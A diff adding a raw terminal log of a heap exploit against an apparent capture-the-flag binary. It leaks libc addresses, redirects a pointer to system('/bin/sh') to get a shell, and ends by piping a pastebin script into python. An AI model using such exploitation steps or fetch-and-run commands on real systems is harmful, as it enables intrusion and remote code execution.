@@ -1,0 +1,360 @@
+$ ./succ.py
+               )\         O_._._._A_._._._O         /(
+                \`--.___,'=================`.___,--'/            You see before you
+                 \`--._.__                 __._,--'/
+                   \  ,. l`~~~~~~~~~~~~~~~'l ,.  /
+       __            \||(_)!_!_!_.-._!_!_!(_)||/            __
+       \\`-.__        ||_|____!!_|;|_!!____|_||        __,-'//   The Temple of Malloc
+        \\    `==---='-----------'='-----------`=---=='    //
+        | `--.                                         ,--' |
+         \  ,.`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~',.  /
+           \||  ____,-------._,-------._,-------.____  ||/       Only the True will find divinity
+            ||\|___!`======="!`======="!`======="!___|/||
+            || |---||--------||-| | |-!!--------||---| ||
+  __O_____O_ll_lO_____O_____O|| |'|'| ||O_____O_____Ol_ll_O_____O__
+  o H o o H o o H o o H o o |-----------| o o H o o H o o H o o H o
+ ___H_____H_____H_____H____O =========== O____H_____H_____H_____H___
+                          /|=============|\
+()______()______()______() '==== +-+ ====' ()______()______()______()
+||{_}{_}||{_}{_}||{_}{_}/| ===== |_| ===== |\{_}{_}||{_}{_}||{_}{_}||
+||      ||      ||     / |==== s(   )s ====| \     ||      ||      ||
+======================()  =================  ()======================
+----------------------/| ------------------- |\----------------------
+                     / |---------------------| \
+-'--'--'           ()  '---------------------'  ()
+                   /| ------------------------- |\    --'--'--'
+       --'--'     / |---------------------------| \    '--'
+                ()  |___________________________|  ()           '--'-
+  --'-          /| _______________________________  |\
+ --' gpyy      / |__________________________________| \
+
+
+--> '2'
+<--
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+--> '16'
+<-- How much wisdom do you hold?: What is your wisdom?:
+---------------------
+
+
+--> '0123456789ABCDEF'
+<--
+Child, what do you seek?
+---------------------
+
+
+--> '2'
+<--
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What you ask for cannot be found here.
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: How much wisdom do you hold?:
+---------------------
+
+
+--> '16'
+<-- What is your wisdom?:
+---------------------
+
+
+--> '0123456789ABCDEF'
+<--
+Child, what do you seek?
+---------------------
+
+
+--> '2'
+<--
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What you ask for cannot be found here.
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: How much wisdom do you hold?:
+---------------------
+
+
+--> '16'
+<-- What is your wisdom?:
+---------------------
+
+
+--> '0123456789ABCDEF'
+<--
+Child, what do you seek?
+---------------------
+
+
+--> '1'
+<--
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What you ask for cannot be found here.
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What wisdom do you seek?:
+---------------------
+
+
+--> '9'
+<-- 0123456789ABCDEF     - Neonate
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+--> '2'
+<-- How much wisdom do you hold?:
+---------------------
+
+
+--> '64'
+<-- What is your wisdom?:
+---------------------
+
+
+--> '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x0080`\x00\x00\x00\x00\x00\x08
+\x00\x00\x00\x00\x00\x00\x0080`\x00\x00\x00\x00\x00'
+<--
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What you ask for cannot be found here.
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+--> '1'
+<-- What wisdom do you seek?:
+---------------------
+
+
+--> '10'
+<--              -
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+
+
+
+
+'\x10\x9c\x06\xb3\t\x7f\x00\x00'
+109c06b3097f0000
+leak = 0x7f09b3069c10
+libcbase = 0x7f09b2fe8000
+system = 0x7f09b3029490
+binsh = 0x7f09b314b3e8
+
+
+
+
+--> '2'
+<-- How much wisdom do you hold?:
+---------------------
+
+
+--> '16'
+<-- What is your wisdom?:
+---------------------
+
+
+--> '0123456789ABCDEF'
+<--
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What you ask for cannot be found here.
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+--> '2'
+<-- How much wisdom do you hold?:
+---------------------
+
+
+--> '16'
+<-- What is your wisdom?:
+---------------------
+
+
+--> '0123456789ABCDEF'
+<--
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What you ask for cannot be found here.
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+--> '2'
+<-- How much wisdom do you hold?:
+---------------------
+
+
+--> '16'
+<-- What is your wisdom?:
+---------------------
+
+
+--> '0123456789ABCDEF'
+<--
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What you ask for cannot be found here.
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+--> '1'
+<-- What wisdom do you seek?:
+---------------------
+
+
+--> '13'
+<-- 0123456789ABCDEF     - Neonate
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+--> '2'
+<-- How much wisdom do you hold?:
+---------------------
+
+
+--> '64'
+<-- What is your wisdom?:
+---------------------
+
+
+--> '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00p0`\x00\x00\x00\x00\x00\x07
+\x00\x00\x00\x00\x00\x00\x00\xe8\xb3\x14\xb3\t\x7f\x00\x00'
+<--
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What you ask for cannot be found here.
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+--> '3'
+<-- What wisdom do you wish to rethink?:
+---------------------
+
+
+--> '14'
+<-- (8) How do you see this differently?:
+---------------------
+
+
+--> '\x90\x94\x02\xb3\t\x7f\x00\x00'
+<--
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice: What you ask for cannot be found here.
+
+Child, what do you seek?
+[1] Take wisdom
+[2] Give wisdom
+[3] Rethink wisdom
+Your choice:
+---------------------
+
+
+--> '1'
+<-- What wisdom do you seek?:
+---------------------
+
+
+--> '14'
+<--              - /bin/sh
+---------------------
+
+
+'\x90\x94\x02\xb3\t\x7f\x00\x00\t - /bin/sh'
+909402b3097f000009202d202f62696e2f7368
+
+
+$ ls
+--> 'ls'
+<-- flag.txt
+start.sh
+temple
+temple.txt
+
+---------------------
+
+
+$ curl https://pastebin.com/raw/chippyshell | python
+--> 'curl https://pastebin.com/raw/chippyshell | python'
